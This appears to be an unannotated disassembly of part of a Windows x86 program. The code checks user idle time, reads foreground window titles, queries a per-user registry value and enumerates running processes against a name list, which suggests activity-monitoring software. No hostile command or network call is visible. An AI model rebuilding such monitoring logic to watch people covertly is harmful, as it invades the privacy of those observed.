  401dee:	74 17                	je     0x401e07
  401df0:	8b 11                	mov    (%ecx),%edx
  401df2:	89 50 44             	mov    %edx,0x44(%eax)
  401df5:	8b 51 04             	mov    0x4(%ecx),%edx
  401df8:	89 50 48             	mov    %edx,0x48(%eax)
  401dfb:	8b 51 08             	mov    0x8(%ecx),%edx
  401dfe:	89 50 4c             	mov    %edx,0x4c(%eax)
  401e01:	8b 49 0c             	mov    0xc(%ecx),%ecx
  401e04:	89 48 50             	mov    %ecx,0x50(%eax)
  401e07:	8b 54 24 0c          	mov    0xc(%esp),%edx
  401e0b:	89 50 54             	mov    %edx,0x54(%eax)
  401e0e:	8b 4c 24 10          	mov    0x10(%esp),%ecx
  401e12:	89 48 58             	mov    %ecx,0x58(%eax)
  401e15:	8b 54 24 14          	mov    0x14(%esp),%edx
  401e19:	89 50 5c             	mov    %edx,0x5c(%eax)
  401e1c:	8b 4c 24 18          	mov    0x18(%esp),%ecx
  401e20:	89 48 60             	mov    %ecx,0x60(%eax)
  401e23:	8b 54 24 1c          	mov    0x1c(%esp),%edx
  401e27:	89 50 64             	mov    %edx,0x64(%eax)
  401e2a:	8b 4c 24 20          	mov    0x20(%esp),%ecx
  401e2e:	89 48 68             	mov    %ecx,0x68(%eax)
  401e31:	8b 54 24 24          	mov    0x24(%esp),%edx
  401e35:	89 50 6c             	mov    %edx,0x6c(%eax)
  401e38:	8b 4c 24 28          	mov    0x28(%esp),%ecx
  401e3c:	89 48 70             	mov    %ecx,0x70(%eax)
  401e3f:	33 d2                	xor    %edx,%edx
  401e41:	83 7c 24 2c 01       	cmpl   $0x1,0x2c(%esp)
  401e46:	8d 4c 24 30          	lea    0x30(%esp),%ecx
  401e4a:	0f 94 c2             	sete   %dl
  401e4d:	51                   	push   %ecx
  401e4e:	83 c0 04             	add    $0x4,%eax
  401e51:	6a 20                	push   $0x20
  401e53:	50                   	push   %eax
  401e54:	89 50 70             	mov    %edx,0x70(%eax)
  401e57:	e8 1e 0e 01 00       	call   0x412c7a
  401e5c:	83 c4 0c             	add    $0xc,%esp
  401e5f:	ff 06                	incl   (%esi)
  401e61:	b8 01 00 00 00       	mov    $0x1,%eax
  401e66:	5f                   	pop    %edi
  401e67:	5e                   	pop    %esi
  401e68:	8b 4c 24 6c          	mov    0x6c(%esp),%ecx
  401e6c:	33 cc                	xor    %esp,%ecx
  401e6e:	e8 2c 05 01 00       	call   0x41239f
  401e73:	8b e5                	mov    %ebp,%esp
  401e75:	5d                   	pop    %ebp
  401e76:	c2 10 00             	ret    $0x10
  401e79:	8b 4c 24 74          	mov    0x74(%esp),%ecx
  401e7d:	5f                   	pop    %edi
  401e7e:	5e                   	pop    %esi
  401e7f:	33 cc                	xor    %esp,%ecx
  401e81:	33 c0                	xor    %eax,%eax
  401e83:	e8 17 05 01 00       	call   0x41239f
  401e88:	8b e5                	mov    %ebp,%esp
  401e8a:	5d                   	pop    %ebp
  401e8b:	c2 10 00             	ret    $0x10
  401e8e:	cc                   	int3
  401e8f:	cc                   	int3
  401e90:	55                   	push   %ebp
  401e91:	8b ec                	mov    %esp,%ebp
  401e93:	56                   	push   %esi
  401e94:	8b 75 08             	mov    0x8(%ebp),%esi
  401e97:	8b 06                	mov    (%esi),%eax
  401e99:	83 f8 01             	cmp    $0x1,%eax
  401e9c:	7c 7b                	jl     0x401f19
  401e9e:	53                   	push   %ebx
  401e9f:	50                   	push   %eax
  401ea0:	68 70 8e 42 00       	push   $0x428e70
  401ea5:	68 ff 00 00 00       	push   $0xff
  401eaa:	57                   	push   %edi
  401eab:	e8 f7 0a 01 00       	call   0x4129a7
  401eb0:	33 db                	xor    %ebx,%ebx
  401eb2:	83 c4 10             	add    $0x10,%esp
  401eb5:	39 1e                	cmp    %ebx,(%esi)
  401eb7:	7e 5a                	jle    0x401f13
  401eb9:	83 c6 64             	add    $0x64,%esi
  401ebc:	8d 64 24 00          	lea    0x0(%esp),%esp
  401ec0:	83 7e 14 00          	cmpl   $0x0,0x14(%esi)
  401ec4:	74 1b                	je     0x401ee1
  401ec6:	8b 06                	mov    (%esi),%eax
  401ec8:	8b 4e f8             	mov    -0x8(%esi),%ecx
  401ecb:	8b 56 fc             	mov    -0x4(%esi),%edx
  401ece:	50                   	push   %eax
  401ecf:	8b 46 f4             	mov    -0xc(%esi),%eax
  401ed2:	51                   	push   %ecx
  401ed3:	52                   	push   %edx
  401ed4:	50                   	push   %eax
  401ed5:	8d 4e a4             	lea    -0x5c(%esi),%ecx
  401ed8:	51                   	push   %ecx
  401ed9:	57                   	push   %edi
  401eda:	68 88 8e 42 00       	push   $0x428e88
  401edf:	eb 19                	jmp    0x401efa
  401ee1:	8b 16                	mov    (%esi),%edx
  401ee3:	8b 46 f8             	mov    -0x8(%esi),%eax
  401ee6:	8b 4e fc             	mov    -0x4(%esi),%ecx
  401ee9:	52                   	push   %edx
  401eea:	8b 56 f4             	mov    -0xc(%esi),%edx
  401eed:	50                   	push   %eax
  401eee:	51                   	push   %ecx
  401eef:	52                   	push   %edx
  401ef0:	8d 46 a4             	lea    -0x5c(%esi),%eax
  401ef3:	50                   	push   %eax
  401ef4:	57                   	push   %edi
  401ef5:	68 b0 8e 42 00       	push   $0x428eb0
  401efa:	68 ff 00 00 00       	push   $0xff
  401eff:	57                   	push   %edi
  401f00:	e8 a2 0a 01 00       	call   0x4129a7
  401f05:	8b 4d 08             	mov    0x8(%ebp),%ecx
  401f08:	43                   	inc    %ebx
  401f09:	83 c4 24             	add    $0x24,%esp
  401f0c:	83 c6 78             	add    $0x78,%esi
  401f0f:	3b 19                	cmp    (%ecx),%ebx
  401f11:	7c ad                	jl     0x401ec0
  401f13:	5b                   	pop    %ebx
  401f14:	5e                   	pop    %esi
  401f15:	5d                   	pop    %ebp
  401f16:	c2 04 00             	ret    $0x4
  401f19:	68 d8 8e 42 00       	push   $0x428ed8
  401f1e:	57                   	push   %edi
  401f1f:	ff 15 54 51 42 00    	call   *0x425154
  401f25:	5e                   	pop    %esi
  401f26:	5d                   	pop    %ebp
  401f27:	c2 04 00             	ret    $0x4
  401f2a:	cc                   	int3
  401f2b:	cc                   	int3
  401f2c:	cc                   	int3
  401f2d:	cc                   	int3
  401f2e:	cc                   	int3
  401f2f:	cc                   	int3
  401f30:	cc                   	int3
  401f31:	cc                   	int3
  401f32:	cc                   	int3
  401f33:	cc                   	int3
  401f34:	cc                   	int3
  401f35:	cc                   	int3
  401f36:	cc                   	int3
  401f37:	cc                   	int3
  401f38:	cc                   	int3
  401f39:	cc                   	int3
  401f3a:	cc                   	int3
  401f3b:	cc                   	int3
  401f3c:	cc                   	int3
  401f3d:	cc                   	int3
  401f3e:	cc                   	int3
  401f3f:	cc                   	int3
  401f40:	55                   	push   %ebp
  401f41:	8b ec                	mov    %esp,%ebp
  401f43:	83 ec 18             	sub    $0x18,%esp
  401f46:	53                   	push   %ebx
  401f47:	56                   	push   %esi
  401f48:	57                   	push   %edi
  401f49:	68 0a 02 00 00       	push   $0x20a
  401f4e:	e8 d4 09 01 00       	call   0x412927
  401f53:	68 0a 02 00 00       	push   $0x20a
  401f58:	8b f8                	mov    %eax,%edi
  401f5a:	6a 00                	push   $0x0
  401f5c:	57                   	push   %edi
  401f5d:	e8 ce 22 01 00       	call   0x414230
  401f62:	83 c4 10             	add    $0x10,%esp
  401f65:	c6 07 00             	movb   $0x0,(%edi)
  401f68:	be 01 00 00 00       	mov    $0x1,%esi
  401f6d:	c7 45 f4 00 00 00 00 	movl   $0x0,-0xc(%ebp)
  401f74:	8b 45 08             	mov    0x8(%ebp),%eax
  401f77:	8b 48 04             	mov    0x4(%eax),%ecx
  401f7a:	8b 11                	mov    (%ecx),%edx
  401f7c:	8b 42 04             	mov    0x4(%edx),%eax
  401f7f:	ff d0                	call   *%eax
  401f81:	85 c0                	test   %eax,%eax
  401f83:	0f 84 34 01 00 00    	je     0x4020bd
  401f89:	68 10 27 00 00       	push   $0x2710
  401f8e:	ff 15 50 51 42 00    	call   *0x425150
  401f94:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  401f97:	51                   	push   %ecx
  401f98:	c7 45 ec 08 00 00 00 	movl   $0x8,-0x14(%ebp)
  401f9f:	ff 15 b4 52 42 00    	call   *0x4252b4
  401fa5:	ff 15 4c 51 42 00    	call   *0x42514c
  401fab:	2b 45 f0             	sub    -0x10(%ebp),%eax
  401fae:	3d 20 bf 02 00       	cmp    $0x2bf20,%eax
  401fb3:	76 19                	jbe    0x401fce
  401fb5:	68 24 8d 42 00       	push   $0x428d24
  401fba:	8d 57 02             	lea    0x2(%edi),%edx
  401fbd:	6a 0a                	push   $0xa
  401fbf:	52                   	push   %edx
  401fc0:	e8 b5 0c 01 00       	call   0x412c7a
  401fc5:	c7 45 f8 01 00 00 00 	movl   $0x1,-0x8(%ebp)
  401fcc:	eb 17                	jmp    0x401fe5
  401fce:	68 20 8d 42 00       	push   $0x428d20
  401fd3:	8d 47 02             	lea    0x2(%edi),%eax
  401fd6:	6a 0a                	push   $0xa
  401fd8:	50                   	push   %eax
  401fd9:	e8 9c 0c 01 00       	call   0x412c7a
  401fde:	c7 45 f8 00 00 00 00 	movl   $0x0,-0x8(%ebp)
  401fe5:	83 c4 0c             	add    $0xc,%esp
  401fe8:	ff 15 88 52 42 00    	call   *0x425288
  401fee:	8b d8                	mov    %eax,%ebx
  401ff0:	3b de                	cmp    %esi,%ebx
  401ff2:	75 0c                	jne    0x402000
  401ff4:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  401ff7:	39 4d f8             	cmp    %ecx,-0x8(%ebp)
  401ffa:	0f 84 74 ff ff ff    	je     0x401f74
  402000:	8d 77 16             	lea    0x16(%edi),%esi
  402003:	56                   	push   %esi
  402004:	68 f4 01 00 00       	push   $0x1f4
  402009:	6a 0d                	push   $0xd
  40200b:	53                   	push   %ebx
  40200c:	ff 15 8c 52 42 00    	call   *0x42528c
  402012:	b9 f0 8e 42 00       	mov    $0x428ef0,%ecx
  402017:	8b c6                	mov    %esi,%eax
  402019:	8d a4 24 00 00 00 00 	lea    0x0(%esp),%esp
  402020:	66 8b 10             	mov    (%eax),%dx
  402023:	66 3b 11             	cmp    (%ecx),%dx
  402026:	75 1e                	jne    0x402046
  402028:	66 85 d2             	test   %dx,%dx
  40202b:	74 15                	je     0x402042
  40202d:	66 8b 50 02          	mov    0x2(%eax),%dx
  402031:	66 3b 51 02          	cmp    0x2(%ecx),%dx
  402035:	75 0f                	jne    0x402046
  402037:	83 c0 04             	add    $0x4,%eax
  40203a:	83 c1 04             	add    $0x4,%ecx
  40203d:	66 85 d2             	test   %dx,%dx
  402040:	75 de                	jne    0x402020
  402042:	33 c0                	xor    %eax,%eax
  402044:	eb 05                	jmp    0x40204b
  402046:	1b c0                	sbb    %eax,%eax
  402048:	83 d8 ff             	sbb    $0xffffffff,%eax
  40204b:	85 c0                	test   %eax,%eax
  40204d:	75 13                	jne    0x402062
  40204f:	68 10 8e 42 00       	push   $0x428e10
  402054:	68 fa 00 00 00       	push   $0xfa
  402059:	56                   	push   %esi
  40205a:	e8 48 09 01 00       	call   0x4129a7
  40205f:	83 c4 0c             	add    $0xc,%esp
  402062:	68 f4 8e 42 00       	push   $0x428ef4
  402067:	56                   	push   %esi
  402068:	e8 16 0b 01 00       	call   0x412b83
  40206d:	83 c4 08             	add    $0x8,%esp
  402070:	68 0a 02 00 00       	push   $0x20a
  402075:	57                   	push   %edi
  402076:	85 c0                	test   %eax,%eax
  402078:	74 29                	je     0x4020a3
  40207a:	8b 75 08             	mov    0x8(%ebp),%esi
  40207d:	8b 4e 04             	mov    0x4(%esi),%ecx
  402080:	8b 11                	mov    (%ecx),%edx
  402082:	8b 42 08             	mov    0x8(%edx),%eax
  402085:	ff d0                	call   *%eax
  402087:	8b 4e 04             	mov    0x4(%esi),%ecx
  40208a:	8b 11                	mov    (%ecx),%edx
  40208c:	8b 02                	mov    (%edx),%eax
  40208e:	ff d0                	call   *%eax
  402090:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  402093:	89 1d b8 2f 43 00    	mov    %ebx,0x432fb8
  402099:	8b f3                	mov    %ebx,%esi
  40209b:	89 4d f4             	mov    %ecx,-0xc(%ebp)
  40209e:	e9 d1 fe ff ff       	jmp    0x401f74
  4020a3:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4020a6:	8b 49 04             	mov    0x4(%ecx),%ecx
  4020a9:	8b 11                	mov    (%ecx),%edx
  4020ab:	8b 42 08             	mov    0x8(%edx),%eax
  4020ae:	ff d0                	call   *%eax
  4020b0:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  4020b3:	8b f3                	mov    %ebx,%esi
  4020b5:	89 4d f4             	mov    %ecx,-0xc(%ebp)
  4020b8:	e9 b7 fe ff ff       	jmp    0x401f74
  4020bd:	57                   	push   %edi
  4020be:	e8 0a 04 01 00       	call   0x4124cd
  4020c3:	83 c4 04             	add    $0x4,%esp
  4020c6:	5f                   	pop    %edi
  4020c7:	5e                   	pop    %esi
  4020c8:	33 c0                	xor    %eax,%eax
  4020ca:	5b                   	pop    %ebx
  4020cb:	8b e5                	mov    %ebp,%esp
  4020cd:	5d                   	pop    %ebp
  4020ce:	c2 04 00             	ret    $0x4
  4020d1:	cc                   	int3
  4020d2:	cc                   	int3
  4020d3:	cc                   	int3
  4020d4:	cc                   	int3
  4020d5:	cc                   	int3
  4020d6:	cc                   	int3
  4020d7:	cc                   	int3
  4020d8:	cc                   	int3
  4020d9:	cc                   	int3
  4020da:	cc                   	int3
  4020db:	cc                   	int3
  4020dc:	cc                   	int3
  4020dd:	cc                   	int3
  4020de:	cc                   	int3
  4020df:	cc                   	int3
  4020e0:	55                   	push   %ebp
  4020e1:	8b ec                	mov    %esp,%ebp
  4020e3:	83 ec 68             	sub    $0x68,%esp
  4020e6:	a1 bc d1 42 00       	mov    0x42d1bc,%eax
  4020eb:	33 c5                	xor    %ebp,%eax
  4020ed:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4020f0:	6a 64                	push   $0x64
  4020f2:	8d 45 98             	lea    -0x68(%ebp),%eax
  4020f5:	6a 00                	push   $0x0
  4020f7:	50                   	push   %eax
  4020f8:	e8 33 21 01 00       	call   0x414230
  4020fd:	83 c4 0c             	add    $0xc,%esp
  402100:	8d 4d 98             	lea    -0x68(%ebp),%ecx
  402103:	51                   	push   %ecx
  402104:	ff 15 6c 51 42 00    	call   *0x42516c
  40210a:	6a 02                	push   $0x2
  40210c:	8d 55 98             	lea    -0x68(%ebp),%edx
  40210f:	52                   	push   %edx
  402110:	68 01 00 00 80       	push   $0x80000001
  402115:	ba fc 8e 42 00       	mov    $0x428efc,%edx
  40211a:	b9 08 8f 42 00       	mov    $0x428f08,%ecx
  40211f:	e8 7c 0e 00 00       	call   0x402fa0
  402124:	83 c4 0c             	add    $0xc,%esp
  402127:	85 c0                	test   %eax,%eax
  402129:	74 26                	je     0x402151
  40212b:	68 10 8f 42 00       	push   $0x428f10
  402130:	8d 45 98             	lea    -0x68(%ebp),%eax
  402133:	50                   	push   %eax
  402134:	ff 15 48 51 42 00    	call   *0x425148
  40213a:	85 c0                	test   %eax,%eax
  40213c:	75 13                	jne    0x402151
  40213e:	b8 01 00 00 00       	mov    $0x1,%eax
  402143:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  402146:	33 cd                	xor    %ebp,%ecx
  402148:	e8 52 02 01 00       	call   0x41239f
  40214d:	8b e5                	mov    %ebp,%esp
  40214f:	5d                   	pop    %ebp
  402150:	c3                   	ret
  402151:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  402154:	33 cd                	xor    %ebp,%ecx
  402156:	33 c0                	xor    %eax,%eax
  402158:	e8 42 02 01 00       	call   0x41239f
  40215d:	8b e5                	mov    %ebp,%esp
  40215f:	5d                   	pop    %ebp
  402160:	c3                   	ret
  402161:	cc                   	int3
  402162:	cc                   	int3
  402163:	cc                   	int3
  402164:	cc                   	int3
  402165:	cc                   	int3
  402166:	cc                   	int3
  402167:	cc                   	int3
  402168:	cc                   	int3
  402169:	cc                   	int3
  40216a:	cc                   	int3
  40216b:	cc                   	int3
  40216c:	cc                   	int3
  40216d:	cc                   	int3
  40216e:	cc                   	int3
  40216f:	cc                   	int3
  402170:	55                   	push   %ebp
  402171:	8b ec                	mov    %esp,%ebp
  402173:	83 ec 08             	sub    $0x8,%esp
  402176:	53                   	push   %ebx
  402177:	6a 00                	push   $0x0
  402179:	ff 15 2c 51 42 00    	call   *0x42512c
  40217f:	89 45 f8             	mov    %eax,-0x8(%ebp)
  402182:	ff 15 d4 50 42 00    	call   *0x4250d4
  402188:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40218b:	8d 45 fc             	lea    -0x4(%ebp),%eax
  40218e:	50                   	push   %eax
  40218f:	8d 5d f8             	lea    -0x8(%ebp),%ebx
  402192:	e8 f9 73 00 00       	call   0x409590
  402197:	83 c4 04             	add    $0x4,%esp
  40219a:	84 c0                	test   %al,%al
  40219c:	75 09                	jne    0x4021a7
  40219e:	33 c0                	xor    %eax,%eax
  4021a0:	5b                   	pop    %ebx
  4021a1:	8b e5                	mov    %ebp,%esp
  4021a3:	5d                   	pop    %ebp
  4021a4:	c2 04 00             	ret    $0x4
  4021a7:	e8 04 77 00 00       	call   0x4098b0
  4021ac:	cc                   	int3
  4021ad:	cc                   	int3
  4021ae:	cc                   	int3
  4021af:	cc                   	int3
  4021b0:	55                   	push   %ebp
  4021b1:	8b ec                	mov    %esp,%ebp
  4021b3:	81 ec 38 02 00 00    	sub    $0x238,%esp
  4021b9:	a1 bc d1 42 00       	mov    0x42d1bc,%eax
  4021be:	33 c5                	xor    %ebp,%eax
  4021c0:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4021c3:	53                   	push   %ebx
  4021c4:	33 db                	xor    %ebx,%ebx
  4021c6:	68 fe 01 00 00       	push   $0x1fe
  4021cb:	53                   	push   %ebx
  4021cc:	68 60 5d 43 00       	push   $0x435d60
  4021d1:	89 9d c8 fd ff ff    	mov    %ebx,-0x238(%ebp)
  4021d7:	e8 54 20 01 00       	call   0x414230
  4021dc:	a1 d0 1b 43 00       	mov    0x431bd0,%eax
  4021e1:	68 44 8f 42 00       	push   $0x428f44
  4021e6:	50                   	push   %eax
  4021e7:	e8 97 09 01 00       	call   0x412b83
  4021ec:	83 c4 14             	add    $0x14,%esp
  4021ef:	85 c0                	test   %eax,%eax
  4021f1:	0f 85 2e 01 00 00    	jne    0x402325
  4021f7:	56                   	push   %esi
  4021f8:	57                   	push   %edi
  4021f9:	be d0 1b 43 00       	mov    $0x431bd0,%esi
  4021fe:	89 9d cc fd ff ff    	mov    %ebx,-0x234(%ebp)
  402204:	eb 0a                	jmp    0x402210
  402206:	8d a4 24 00 00 00 00 	lea    0x0(%esp),%esp
  40220d:	8d 49 00             	lea    0x0(%ecx),%ecx
  402210:	8b 36                	mov    (%esi),%esi
  402212:	68 28 02 00 00       	push   $0x228
  402217:	8d 8d d4 fd ff ff    	lea    -0x22c(%ebp),%ecx
  40221d:	53                   	push   %ebx
  40221e:	51                   	push   %ecx
  40221f:	89 9d d0 fd ff ff    	mov    %ebx,-0x230(%ebp)
  402225:	e8 06 20 01 00       	call   0x414230
  40222a:	83 c4 0c             	add    $0xc,%esp
  40222d:	53                   	push   %ebx
  40222e:	6a 02                	push   $0x2
  402230:	ff 15 4c 50 42 00    	call   *0x42504c
  402236:	8b f8                	mov    %eax,%edi
  402238:	83 ff ff             	cmp    $0xffffffff,%edi
  40223b:	0f 84 a6 00 00 00    	je     0x4022e7
  402241:	8d 95 d0 fd ff ff    	lea    -0x230(%ebp),%edx
  402247:	52                   	push   %edx
  402248:	57                   	push   %edi
  402249:	c7 85 d0 fd ff ff 2c 	movl   $0x22c,-0x230(%ebp)
  402250:	02 00 00 
  402253:	ff 15 50 50 42 00    	call   *0x425050
  402259:	85 c0                	test   %eax,%eax
  40225b:	74 4c                	je     0x4022a9
  40225d:	8d 49 00             	lea    0x0(%ecx),%ecx
  402260:	8b ce                	mov    %esi,%ecx
  402262:	8d 85 f4 fd ff ff    	lea    -0x20c(%ebp),%eax
  402268:	66 8b 10             	mov    (%eax),%dx
  40226b:	66 3b 11             	cmp    (%ecx),%dx
  40226e:	75 1e                	jne    0x40228e
  402270:	66 3b d3             	cmp    %bx,%dx
  402273:	74 15                	je     0x40228a
  402275:	66 8b 50 02          	mov    0x2(%eax),%dx
  402279:	66 3b 51 02          	cmp    0x2(%ecx),%dx
  40227d:	75 0f                	jne    0x40228e
  40227f:	83 c0 04             	add    $0x4,%eax
  402282:	83 c1 04             	add    $0x4,%ecx
  402285:	66 3b d3             	cmp    %bx,%dx
  402288:	75 de                	jne    0x402268
  40228a:	33 c0                	xor    %eax,%eax
  40228c:	eb 05                	jmp    0x402293
  40228e:	1b c0                	sbb    %eax,%eax
  402290:	83 d8 ff             	sbb    $0xffffffff,%eax
  402293:	3b c3                	cmp    %ebx,%eax
  402295:	74 1b                	je     0x4022b2
  402297:	8d 85 d0 fd ff ff    	lea    -0x230(%ebp),%eax
  40229d:	50                   	push   %eax
  40229e:	57                   	push   %edi
  40229f:	ff 15 54 50 42 00    	call   *0x425054
  4022a5:	85 c0                	test   %eax,%eax
  4022a7:	75 b7                	jne    0x402260
  4022a9:	57                   	push   %edi
  4022aa:	ff 15 58 50 42 00    	call   *0x425058
  4022b0:	eb 35                	jmp    0x4022e7
  4022b2:	57                   	push   %edi
  4022b3:	ff 15 58 50 42 00    	call   *0x425058
  4022b9:	39 9d d8 fd ff ff    	cmp    %ebx,-0x228(%ebp)
  4022bf:	74 26                	je     0x4022e7
  4022c1:	8b 8d cc fd ff ff    	mov    -0x234(%ebp),%ecx
  4022c7:	8b 91 d4 1b 43 00    	mov    0x431bd4(%ecx),%edx
  4022cd:	8b 35 54 51 42 00    	mov    0x425154,%esi
  4022d3:	52                   	push   %edx
  4022d4:	68 60 5d 43 00       	push   $0x435d60
  4022d9:	ff d6                	call   *%esi
  4022db:	68 48 8f 42 00       	push   $0x428f48
  4022e0:	68 60 5d 43 00       	push   $0x435d60
  4022e5:	ff d6                	call   *%esi
  4022e7:	8b 85 c8 fd ff ff    	mov    -0x238(%ebp),%eax
  4022ed:	40                   	inc    %eax
  4022ee:	8d 34 c5 00 00 00 00 	lea    0x0(,%eax,8),%esi
  4022f5:	89 b5 cc fd ff ff    	mov    %esi,-0x234(%ebp)
  4022fb:	89 85 c8 fd ff ff    	mov    %eax,-0x238(%ebp)
  402301:	8b 86 d0 1b 43 00    	mov    0x431bd0(%esi),%eax
  402307:	8d b6 d0 1b 43 00    	lea    0x431bd0(%esi),%esi
  40230d:	68 44 8f 42 00       	push   $0x428f44
  402312:	50                   	push   %eax
  402313:	e8 6b 08 01 00       	call   0x412b83
  402318:	83 c4 08             	add    $0x8,%esp
  40231b:	85 c0                	test   %eax,%eax
  40231d:	0f 84 ed fe ff ff    	je     0x402210
  402323:	5f                   	pop    %edi
  402324:	5e                   	pop    %esi
  402325:	68 44 8f 42 00       	push   $0x428f44
  40232a:	68 60 5d 43 00       	push   $0x435d60
  40232f:	e8 4f 08 01 00       	call   0x412b83
  402334:	83 c4 08             	add    $0x8,%esp
  402337:	5b                   	pop    %ebx
  402338:	85 c0                	test   %eax,%eax
  40233a:	75 10                	jne    0x40234c
  40233c:	68 10 8e 42 00       	push   $0x428e10
  402341:	68 60 5d 43 00       	push   $0x435d60
  402346:	ff 15 54 51 42 00    	call   *0x425154
  40234c:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40234f:	33 cd                	xor    %ebp,%ecx
  402351:	b8 60 5d 43 00       	mov    $0x435d60,%eax
  402356:	e8 44 00 01 00       	call   0x41239f
  40235b:	8b e5                	mov    %ebp,%esp
  40235d:	5d                   	pop    %ebp
  40235e:	c3                   	ret
  40235f:	cc                   	int3
  402360:	55                   	push   %ebp
  402361:	8b ec                	mov    %esp,%ebp
  402363:	6a ff                	push   $0xffffffff
  402365:	68 8c 3f 42 00       	push   $0x423f8c
  40236a:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  402370:	50                   	push   %eax
  402371:	81 ec 74 01 00 00    	sub    $0x174,%esp
  402377:	a1 bc d1 42 00       	mov    0x42d1bc,%eax
  40237c:	33 c5                	xor    %ebp,%eax
  40237e:	89 45 f0             	mov    %eax,-0x10(%ebp)
  402381:	53                   	push   %ebx
  402382:	56                   	push   %esi
  402383:	57                   	push   %edi
  402384:	50                   	push   %eax
  402385:	8d 45 f4             	lea    -0xc(%ebp),%eax
  402388:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  40238e:	33 db                	xor    %ebx,%ebx
  402390:	53                   	push   %ebx
  402391:	6a 07                	push   $0x7
  402393:	8d 85 e8 fe ff ff    	lea    -0x118(%ebp),%eax
  402399:	50                   	push   %eax
  40239a:	53                   	push   %ebx
  40239b:	ff 15 58 52 42 00    	call   *0x425258
  4023a1:	89 9d 84 fe ff ff    	mov    %ebx,-0x17c(%ebp)
  4023a7:	89 9d 88 fe ff ff    	mov    %ebx,-0x178(%ebp)
  4023ad:	89 9d 8c fe ff ff    	mov    %ebx,-0x174(%ebp)
  4023b3:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  4023b6:	bf 0f 00 00 00       	mov    $0xf,%edi
  4023bb:	8d 85 e8 fe ff ff    	lea    -0x118(%ebp),%eax
  4023c1:	89 bd a8 fe ff ff    	mov    %edi,-0x158(%ebp)
  4023c7:	89 9d a4 fe ff ff    	mov    %ebx,-0x15c(%ebp)
  4023cd:	88 9d 94 fe ff ff    	mov    %bl,-0x16c(%ebp)
  4023d3:	8d 50 01             	lea    0x1(%eax),%edx
  4023d6:	8a 08                	mov    (%eax),%cl
  4023d8:	40                   	inc    %eax
  4023d9:	3a cb                	cmp    %bl,%cl
  4023db:	75 f9                	jne    0x4023d6
  4023dd:	2b c2                	sub    %edx,%eax
  4023df:	50                   	push   %eax
  4023e0:	8d 8d e8 fe ff ff    	lea    -0x118(%ebp),%ecx
  4023e6:	51                   	push   %ecx
  4023e7:	8d 8d 94 fe ff ff    	lea    -0x16c(%ebp),%ecx
  4023ed:	e8 fe 15 00 00       	call   0x4039f0
  4023f2:	c6 45 fc 01          	movb   $0x1,-0x4(%ebp)
  4023f6:	6a 0d                	push   $0xd
  4023f8:	68 50 8f 42 00       	push   $0x428f50
  4023fd:	8d 8d cc fe ff ff    	lea    -0x134(%ebp),%ecx
  402403:	89 bd e0 fe ff ff    	mov    %edi,-0x120(%ebp)
  402409:	89 9d dc fe ff ff    	mov    %ebx,-0x124(%ebp)
  40240f:	88 9d cc fe ff ff    	mov    %bl,-0x134(%ebp)
  402415:	e8 d6 15 00 00       	call   0x4039f0
  40241a:	8d 95 e8 fe ff ff    	lea    -0x118(%ebp),%edx
  402420:	52                   	push   %edx
  402421:	8d 85 b0 fe ff ff    	lea    -0x150(%ebp),%eax
  402427:	50                   	push   %eax
  402428:	8d 9d cc fe ff ff    	lea    -0x134(%ebp),%ebx
  40242e:	c6 45 fc 02          	movb   $0x2,-0x4(%ebp)
  402432:	e8 69 1e 00 00       	call   0x4042a0
  402437:	83 c4 08             	add    $0x8,%esp
  40243a:	8b 85 b0 fe ff ff    	mov    -0x150(%ebp),%eax
  402440:	be 10 00 00 00       	mov    $0x10,%esi
  402445:	39 b5 c4 fe ff ff    	cmp    %esi,-0x13c(%ebp)
  40244b:	73 06                	jae    0x402453
  40244d:	8d 85 b0 fe ff ff    	lea    -0x150(%ebp),%eax
  402453:	33 db                	xor    %ebx,%ebx
  402455:	53                   	push   %ebx
  402456:	50                   	push   %eax
  402457:	e8 06 08 01 00       	call   0x412c62
  40245c:	83 c4 08             	add    $0x8,%esp
  40245f:	c6 45 fc 02          	movb   $0x2,-0x4(%ebp)
  402463:	85 c0                	test   %eax,%eax
  402465:	0f 85 9e 00 00 00    	jne    0x402509
  40246b:	39 b5 c4 fe ff ff    	cmp    %esi,-0x13c(%ebp)
  402471:	72 0f                	jb     0x402482
  402473:	8b 8d b0 fe ff ff    	mov    -0x150(%ebp),%ecx
  402479:	51                   	push   %ecx
  40247a:	e8 4e 00 01 00       	call   0x4124cd
  40247f:	83 c4 04             	add    $0x4,%esp
  402482:	c6 45 fc 01          	movb   $0x1,-0x4(%ebp)
  402486:	89 bd c4 fe ff ff    	mov    %edi,-0x13c(%ebp)
  40248c:	89 9d c0 fe ff ff    	mov    %ebx,-0x140(%ebp)
  402492:	88 9d b0 fe ff ff    	mov    %bl,-0x150(%ebp)
  402498:	39 b5 e0 fe ff ff    	cmp    %esi,-0x120(%ebp)
  40249e:	72 0f                	jb     0x4024af
  4024a0:	8b 95 cc fe ff ff    	mov    -0x134(%ebp),%edx
  4024a6:	52                   	push   %edx
  4024a7:	e8 21 00 01 00       	call   0x4124cd
  4024ac:	83 c4 04             	add    $0x4,%esp
  4024af:	88 5d fc             	mov    %bl,-0x4(%ebp)
  4024b2:	89 bd e0 fe ff ff    	mov    %edi,-0x120(%ebp)
  4024b8:	89 9d dc fe ff ff    	mov    %ebx,-0x124(%ebp)
  4024be:	88 9d cc fe ff ff    	mov    %bl,-0x134(%ebp)
  4024c4:	39 b5 a8 fe ff ff    	cmp    %esi,-0x158(%ebp)
  4024ca:	72 0f                	jb     0x4024db
  4024cc:	8b 85 94 fe ff ff    	mov    -0x16c(%ebp),%eax
  4024d2:	50                   	push   %eax
  4024d3:	e8 f5 ff 00 00       	call   0x4124cd
  4024d8:	83 c4 04             	add    $0x4,%esp
  4024db:	89 9d a4 fe ff ff    	mov    %ebx,-0x15c(%ebp)
  4024e1:	88 9d 94 fe ff ff    	mov    %bl,-0x16c(%ebp)
